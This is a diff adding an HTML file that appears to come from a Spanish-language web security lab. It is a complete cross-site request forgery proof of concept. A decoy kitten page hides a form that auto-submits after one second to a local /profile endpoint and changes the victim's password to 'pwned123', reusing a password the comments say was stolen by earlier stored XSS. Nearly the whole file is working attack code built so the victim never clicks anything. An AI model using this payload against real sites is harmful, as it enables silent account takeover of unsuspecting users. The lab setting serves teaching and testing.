@@ -1,0 +1,34 @@
+<!-- csrf_attack.html -->
+<html>
+  <head>
+    <title>Gatitos Adorables</title>
+  </head>
+  <body>
+    <h1 style="font-family: sans-serif; text-align: center;">¡Mira qué gatito más lindo!</h1>
+    <div style="text-align: center;">
+        <img src="gatito.jpg" alt="Un gatito adorable">
+        <p>Cargando más gatitos...</p>
+    </div>
+
+    <!-- EL ATAQUE: Formulario CSRF oculto -->
+    <form id="csrf-form" action="http://localhost:8080/profile" method="POST" style="display:none;">
+      <!-- Acción que queremos ejecutar -->
+      <input type="hidden" name="action" value="change_password" />
+      
+      <!-- Datos necesarios para que el servidor acepte la petición -->
+      <!-- En este lab, asumimos que sabemos la pass actual (admin123) gracias a un previo ataque de XSS Stored -->
+      <input type="hidden" name="current_password" value="admin123" />
+      
+      <!-- La nueva contraseña que queremos imponer -->
+      <input type="hidden" name="new_password" value="pwned123" />
+    </form>
+
+    <script>
+      // JavaScript envía el formulario automáticamente nada más cargar la página
+      // La víctima no tiene que hacer clic en nada.
+      setTimeout(function() {
+          document.getElementById('csrf-form').submit();
+      }, 1000); // Esperamos 1 segundo para que vea el gatito antes del ataque
+    </script>
+  </body>
+</html>
